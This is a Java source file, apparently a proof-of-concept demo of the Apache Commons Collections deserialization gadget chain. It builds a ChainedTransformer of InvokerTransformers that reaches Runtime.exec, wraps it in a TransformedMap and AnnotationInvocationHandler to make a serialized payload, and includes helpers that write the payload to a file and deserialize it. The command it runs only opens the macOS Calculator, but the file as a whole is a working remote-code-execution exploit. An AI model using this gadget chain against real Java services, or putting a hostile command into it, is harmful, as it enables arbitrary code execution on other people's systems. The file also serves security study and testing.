import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;


public class Demo {
    public static Object generatePayload() throws Exception {
        Transformer transformerChain = generateChainedTransformer();

        Map innerMap = new HashMap();
        innerMap.put("value", "madneal");
        Map outputMap = TransformedMap.decorate(innerMap, null, transformerChain);
        Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class);
        ctor.setAccessible(true);
        Object instance = ctor.newInstance(Retention.class, outputMap);
        return instance;
    }

    public static void main(String[] args) throws Exception {
//        payload2File(generatePayload(), "obj");
//        payloadTest("obj");
//        Runtime.getRuntime().exec(new String [] { "/Applications/Calculator.app/Contents/MacOS/Calculator" });
        exploit();
    }

    public static void payload2File(Object instance, String file) throws Exception {
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(file));
        out.writeObject(instance);
        out.flush();
        out.close();
    }

    public static void payloadTest(String file) throws Exception {
        ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));
        in.readObject();
        in.close();
    }

    public static void simpleExploit() throws Exception {
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class},
                new Object[]{new String("/Applications/Calculator.app/Contents/MacOS/Calculator")});
        invokerTransformer.transform(Runtime.getRuntime());
    }

    public static void exploit() throws Exception {
        Transformer chainedTransformer = generateChainedTransformer();
        Map inmap = new HashMap();
        inmap.put("key", "value");
        Map outmap = TransformedMap.decorate(inmap, null, chainedTransformer);
        for (Iterator iterator = outmap.entrySet().iterator(); iterator.hasNext();) {
            Map.Entry entry = (Map.Entry) iterator.next();
            entry.setValue("123");
        }
    }

    private static Transformer generateChainedTransformer() {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class}, new Object[] {"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class}, new Object[] {null, new Object[0]}),
                new InvokerTransformer("exec", new Class[] {String.class}, new Object[]{"/Applications/Calculator.app/Contents/MacOS/Calculator"})
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        return chainedTransformer;
    }
}